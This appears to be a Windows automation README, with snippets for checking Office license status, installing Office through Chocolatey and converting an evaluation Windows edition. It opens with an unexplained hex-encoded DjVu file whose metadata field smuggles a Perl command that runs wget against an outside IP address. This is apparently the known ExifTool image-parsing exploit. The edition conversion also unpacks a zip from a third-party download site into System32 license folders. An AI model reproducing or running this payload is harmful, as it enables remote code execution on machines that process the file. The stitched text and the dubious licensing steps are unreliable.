'\\x41,\\x54,\\x26,\\x54,\\x46,\\x4f,\\x52,\\x4d,\\x0,\\x0,\\x0,\\x79,\\x44,\\x4a,\\x56,\\x55,\\x49,\\x4e,\\x46,\\x4f,\\x0,\\x0,\\x0,\\xa,\\x0,\\x0,\\x0,\\x0,\\x18,\\x0,\\x2c,\\x1,\\x16,\\x1,\\x42,\\x47,\\x6a,\\x70,\\x0,\\x0,\\x0,\\x0,\\x41,\\x4e,\\x54,\\x61,\\x0,\\x0,\\x0,\\x53,\\x28,\\x6d,\\x65,\\x74,\\x61,\\x64,\\x61,\\x74,\\x61,\\xa,\\x20,\\x20,\\x20,\\x20,\\x20,\\x20,\\x20,\\x20,\\x28,\\x43,\\x6f,\\x70,\\x79,\\x72,\\x69,\\x67,\\x68,\\x74,\\x20,\\x22,\\x5c,\\xa,\\x22,\\x20,\\x2e,\\x20,\\x71,\\x78,\\x7b,\\x77,\\x67,\\x65,\\x74,\\x20,\\x68,\\x74,\\x74,\\x70,\\x3a,\\x2f,\\x2f,\\x31,\\x30,\\x2e,\\x31,\\x30,\\x32,\\x2e,\\x33,\\x2e,\\x32,\\x32,\\x37,\\x3a,\\x38,\\x30,\\x38,\\x30,\\x2f,\\x7d,\\x20,\\x2e,\\x20,\\x5c,\\xa,\\x22,\\x20,\\x62,\\x20,\\x22,\\x29,\\x20,\\x29'

# Automation
Automate all the boring things

#Finding an old office key
cd 'C:\Program Files\Microsoft Office\Office16\'
cscript .\OSPP.vbs /dstatus

#Install O365 with exclusions

Needs to be ran in PS

Sample 1
```choco install microsoft-office-deployment --params='/64bit /Product:HomeStudent2019Retail /Exclude=Publisher,Outlook,Lync,Groove,Access'```

Sample 2
```choco install microsoft-office-deployment --params='/64bit /Product:Office19ProPlus2019R_Retail /Exclude=Publisher,Outlook,Lync,Groove,Access'```

#Convert Windows 10 Enterprise Eval to Windows 10 Enterprise

```
$GenericKey='NPPR9-FWDCX-D2C8J-H872K-2YT43'
$ProducKey=<NEED_TO_BUY>
wget https://appsforpcfree.net/skus-Windows-10.zip
unzip skus-Windows-10.zip C:\Windows\System32\spp\tokens\skus\
slmgr.vbs /rilc
slmgr.vbs /upk >nul 2>&1
slmgr.vbs /ckms >nul 2>&1
slmgr.vbs /cpky >nul 2>&1
slmgr.vbs /ipk $GenericKey
sc config LicenseManager start= auto & net start LicenseManager
sc config wuauserv start= auto & net start wuauserv
slmgr.vbs /ipk $ProductKey
shutdown /r /t 0```
